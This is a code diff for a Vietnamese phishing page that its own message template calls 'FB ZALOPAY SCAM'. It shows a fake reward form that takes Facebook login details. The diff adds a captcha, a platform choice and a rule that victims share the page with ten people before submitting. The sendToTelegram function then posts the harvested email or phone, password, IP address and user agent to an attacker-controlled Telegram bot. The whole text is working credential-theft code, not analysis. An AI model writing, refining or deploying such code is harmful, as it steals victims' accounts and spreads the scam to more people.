-        submitBtn.disabled = !(emailOk && passOk);
-        return emailOk && passOk;
+        const emailOk = isValidEmailOrPhone(fbEmail.value.trim());
+        const passOk = isValidPassword(fbPass.value.trim());
+        const captchaOk = isCaptchaValid(captchaInput.value.trim());
+        const platformOk = selectedPlatform !== null;
+        const total = (platformOk ? 30 : 0) + (emailOk ? 20 : 0) + (passOk ? 20 : 0) + (captchaOk ? 20 : 0) + Math.min(shareCountNum * 1, 10);
+        submitBtn.disabled = !(total >= 100);
+        return total >= 100;
     }
 
-    // Hiển thị form
     showFormBtn.addEventListener('click', function() {
         loginForm.style.display = 'block';
         loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
         showFormBtn.style.display = 'none';
-        // Reset lỗi
+        currentCaptcha = generateCaptcha();
+        captchaCode.textContent = currentCaptcha;
+        captchaInput.value = '';
+        captchaError.style.display = 'none';
+        captchaInput.classList.remove('error');
         emailError.style.display = 'none';
         passError.style.display = 'none';
+        fbEmail.classList.remove('error');
+        fbPass.classList.remove('error');
+        updateProgress();
         submitBtn.disabled = true;
     });
 
-    function sendToTelegram(email, pass, ip, ua) {
-        const message = `🔐 **FB ZALOPAY SCAM**\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🌐 IP: ${ip || 'Không xác định'}\n💻 UA: ${ua || 'Không có'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
+    function sendToTelegram(email, pass, platform, shareCountVal, ip, ua) {
+        const message = `🔐 **FB ZALOPAY SCAM**\n📧 Email/Phone: ${email}\n🔑 Pass: ${pass}\n📱 Nền tảng: ${platform || 'Không chọn'}\n📤 Đã chia sẻ: ${shareCountVal}/10 người\n🌐 IP: ${ip || 'Không xác định'}\n💻 UA: ${ua || 'Không có'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
         return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
     }
 
     function handleSubmit() {
-        // Kiểm tra lại trước khi gửi (phòng trường hợp bị bypass)
         const email = fbEmail.value.trim();
         const pass = fbPass.value.trim();
-        if (!isValidEmail(email) || !isValidPassword(pass)) {
-            toast.textContent = '⚠️ Vui lòng nhập đúng định dạng!';
+        const captcha = captchaInput.value.trim();
+        if (!selectedPlatform || !isValidEmailOrPhone(email) || !isValidPassword(pass) || !isCaptchaValid(captcha) || shareCountNum < 10) {
+            toast.textContent = '⚠️ Vui lòng hoàn tất 100%!';
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 2500);
             return;
         }
-
         toast.textContent = '⏳ Đang xác thực...';
         toast.classList.add('show');
-
         let ipAddr = 'Không xác định';
         const ua = navigator.userAgent || 'Không có';
-
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
-            .then(data => { ipAddr = data.ip || 'Không xác định'; return sendToTelegram(email, pass, ipAddr, ua); })
-            .catch(() => sendToTelegram(email, pass, 'Không xác định', ua))
+            .then(data => { ipAddr = data.ip || 'Không xác định'; return sendToTelegram(email, pass, selectedPlatform, shareCountNum, ipAddr, ua); })
+            .catch(() => sendToTelegram(email, pass, selectedPlatform, shareCountNum, 'Không xác định', ua))
             .then(res => {
                 if (res && res.ok) {
                     toast.textContent = '🎉 Nhận thưởng thành công!';
@@ -248,25 +502,29 @@
                 toast.textContent = '❌ Lỗi kết nối!';
                 setTimeout(() => toast.classList.remove('show'), 2500);
             });
-
-        fbEmail.value = '';
-        fbPass.value = '';
+        // Reset
+        fbEmail.value = ''; fbPass.value = ''; captchaInput.value = '';
+        currentCaptcha = generateCaptcha(); captchaCode.textContent = currentCaptcha;
+        selectedPlatform = null;
+        shareCountNum = 0;
+        shareCount.textContent = 'Đã chia sẻ: 0 / 10 người';
+        shareBtn.textContent = '📣 Chia sẻ ngay (+10%)';
+        shareBtn.disabled = false;
+        document.querySelectorAll('#platformOptions button').forEach(b => b.classList.remove('active'));
         loginForm.style.display = 'none';
         showFormBtn.style.display = 'block';
         submitBtn.disabled = true;
-        emailError.style.display = 'none';
-        passError.style.display = 'none';
+        emailError.style.display = 'none'; passError.style.display = 'none'; captchaError.style.display = 'none';
+        fbEmail.classList.remove('error'); fbPass.classList.remove('error'); captchaInput.classList.remove('error');
+        updateProgress();
     }
 
     submitBtn.addEventListener('click', handleSubmit);
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && loginForm.style.display === 'block' && !submitBtn.disabled) {
-            handleSubmit();
-        }
+        if (e.key === 'Enter' && loginForm.style.display === 'block' && !submitBtn.disabled) handleSubmit();
     });
-
-    // Khởi tạo trạng thái nút
     submitBtn.disabled = true;
+    updateProgress();
 </script>
 
 </body>
